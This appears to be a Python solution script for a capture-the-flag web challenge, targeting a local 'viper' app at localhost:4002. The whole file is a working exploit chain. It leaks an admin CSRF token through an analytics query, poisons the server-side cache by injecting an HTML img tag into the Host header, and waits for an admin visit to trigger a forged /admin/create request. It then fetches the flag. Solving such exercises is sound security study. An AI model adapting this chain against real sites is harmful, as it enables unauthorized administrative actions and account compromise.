import requests
import base64
import urllib
from time import sleep

base_url = "http://localhost:4002"

s = requests.Session()

# step 1 -> user creates account and gets cookies

r = s.get(base_url + "/create")

viper_id = r.text.split("snake: ")[1].split("</h1>")[0]

print("Viper ID: " + viper_id)

# step 2 -> get csrf token

r = requests.get(base_url + "/analytics?ip_address=__csrftoken__admin_account")

csrfToken = urllib.parse.quote_plus(base64.b64encode(r.text.split("site ")[1].split(" ")[0].encode()))

print("Found CSRF token: " + csrfToken)

# step 3 -> poison server side cache

print("Waiting for previous cache to expire, sleeping for 23 seconds")
sleep(23)

headers = {"host": "localhost:4002<img src='http:&#47;&#47;localhost:4002&#47;admin&#47;create?viperId=eec42479-721b-40ab-9be1-5a93ace9709f&csrfToken=" + csrfToken + "'>"}

r = s.get(base_url + "/viper/" + viper_id, headers=headers, cookies=s.cookies.get_dict())
print(r.text)

# manual step, admin visits poisoned site (can implement using headless chromium)

print("Admin must visit: " + base_url + "/viper/" + viper_id)
print("Sleeping for 10 seconds")

sleep(10)

# get flag

r = requests.get(base_url + "/viper/eec42479-721b-40ab-9be1-5a93ace9709f")

flag = r.text.split("snake: ")[1].split("</h1>")[0]

print(flag)
